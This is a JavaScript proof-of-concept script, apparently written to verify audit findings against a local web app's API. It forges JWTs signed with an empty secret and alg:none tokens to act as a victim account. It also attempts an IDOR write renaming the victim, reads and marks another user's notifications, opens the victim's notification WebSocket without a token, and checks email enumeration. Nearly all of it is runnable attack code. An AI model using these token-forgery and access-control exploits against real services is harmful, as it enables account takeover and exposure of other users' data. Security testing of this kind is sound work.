// ============================================================================
//  VERIFICATION of the critical findings (accurate evidence, no hardcoded claims)
// ============================================================================
import { createHmac } from 'crypto'
const BASE = 'http://localhost:8080/api/'
const hmac = (data, secret) => createHmac('sha256', secret).update(data).digest('base64url')
const b64url = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url')
const uniq = (p) => `${p}_${Date.now()}_${Math.floor(Math.random() * 1e6)}`
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

async function req(method, url, { token, body, headers: extra } = {}) {
  const headers = { 'content-type': 'application/json', ...(extra || {}) }
  if (token) headers.authorization = `Bearer ${token}`
  const res = await fetch(BASE + url, { method, headers, body: body ? JSON.stringify(body) : undefined })
  const ct = res.headers.get('content-type') || ''
  const data = ct.includes('json') ? await res.json() : await res.text()
  return { status: res.status, data }
}

const A = (await req('POST', 'user/signup', { body: { email: uniq('va'), password: 'victim123', firstName: 'VV', lastName: 'A' } })).data
const B = (await req('POST', 'user/signup', { body: { email: uniq('vb'), password: 'attacker123', firstName: 'AA', lastName: 'B' } })).data
const idA = A.result._id, idB = B.result._id, tokenB = B.token

console.log('=== V1. FULL ACCOUNT TAKEOVER: forge HS256 token (iss=victim, empty secret) ===')
const header = b64url({ alg: 'HS256', typ: 'JWT' })
const payload = b64url({ iss: idA, exp: Math.floor(Date.now() / 1000) + 3600 })
const forged = `${header}.${payload}.${hmac(header + '.' + payload, '')}`
const asA = await req('POST', 'posts', { token: forged, body: { title: 'FORGED AS VICTIM', message: 'I am not the victim!' } })
const newPostId = asA.data?._id
const detail = newPostId ? await req('GET', `posts/${newPostId}`, { token: tokenB }) : null
console.log('  forged createPost status:', asA.status, '| creator in stored post:', detail?.data?.post?.creator, '| victim id:', idA)
console.log('  ACCOUNT TAKEOVER:', String(detail?.data?.post?.creator) === String(idA) ? '🔴 CONFIRMED — forged token acts as victim' : 'not confirmed')
if (newPostId) await req('DELETE', `posts/${newPostId}`, { token: forged })

console.log('=== V2. alg:none accepted (no signature) ===')
const none = `${b64url({ alg: 'none', typ: 'JWT' })}.${b64url({ iss: idA, exp: Math.floor(Date.now() / 1000) + 3600 })}.`
const rNone = await req('GET', `user/getUser/${idA}`, { token: none })
console.log('  alg:none getUser status:', rNone.status, '=>', rNone.status === 200 ? '🔴 ACCEPTED' : 'rejected')

console.log('=== V3. control: random garbage token must be rejected ===')
const rGarb = await req('GET', `user/getUser/${idA}`, { token: 'garbage.token.here' })
console.log('  garbage token status:', rGarb.status, '(expect 401 — proves tokens ARE validated)')

console.log('=== V4. what did 1.3 actually do? PATCH user/update with forged _id ===')
const beforeA = (await req('GET', `user/getUser/${idA}`, { token: tokenB })).data?.user
await req('PATCH', 'user/update', { token: tokenB, body: { _id: idA, name: 'HACKED_BY_B', bio: 'pwned', email: A.result.email, password: A.result.password } })
const afterA = (await req('GET', `user/getUser/${idA}`, { token: tokenB })).data?.user
const afterB = (await req('GET', `user/getUser/${idB}`, { token: tokenB })).data?.user
console.log('  victim name before/after:', beforeA?.name, '/', afterA?.name)
console.log('  attacker(B) name after:', afterB?.name)
console.log('  => backend used', afterA?.name === 'HACKED_BY_B' ? '🔴 BODY _id (IDOR write!)' : afterB?.name === 'HACKED_BY_B' ? '🟢 token identity (body _id ignored) — B renamed self' : 'unknown')

console.log('=== V5. notification cross-user read content ===')
const nA = await req('GET', `notification/${idA}`, { token: tokenB })
console.log('  B reads A notifications: status', nA.status, '| count:', nA.data?.notifications?.length)
if (nA.data?.notifications?.[0]) console.log('  sample:', JSON.stringify(nA.data.notifications[0]).slice(0, 160))

console.log('=== V6. B marks A\'s notifications as read ===')
const mark = await req('PATCH', `notification/mark-notification-as-readed/${idA}`, { token: tokenB })
console.log('  B marks A read: status', mark.status, '(any 200 = cross-user write)')

console.log('=== V7. notification WS hijack with message logging ===')
await new Promise((resolve) => {
  let got = null
  let ws = null
  try { ws = new WebSocket(`ws://localhost:8088/ws-notify/${idA}`) } catch { console.log('  connect failed'); return resolve() }
  const finish = (tag) => { try { ws.close() } catch { } console.log(`  ${tag}`); resolve() }
  ws.onopen = async () => {
    console.log('  WS open on victim path WITHOUT token')
    await req('PATCH', `user/${idA}/following`, { token: tokenB })
    setTimeout(() => finish(got !== null ? `🔴 RECEIVED victim event: ${String(got).slice(0, 120)}` : 'no event received'), 3000)
  }
  ws.onmessage = (e) => { got = e.data }
  ws.onerror = () => finish('WS error/closed — not exploitable')
  setTimeout(() => finish(got !== null ? `🔴 RECEIVED victim event: ${String(got).slice(0, 120)}` : 'timeout: no event'), 7000)
})

console.log('=== V8. email enumeration precision ===')
const dup = await req('POST', 'user/signup', { body: { email: A.result.email, password: '123456', firstName: 'x' } })
const fresh = await req('POST', 'user/signup', { body: { email: uniq('fresh'), password: '123456', firstName: 'x' } })
console.log(`  duplicate email -> ${dup.status}, new email -> ${fresh.status} => ${dup.status !== fresh.status ? '🔴 distinguishable (enumeration)' : 'same'}`)
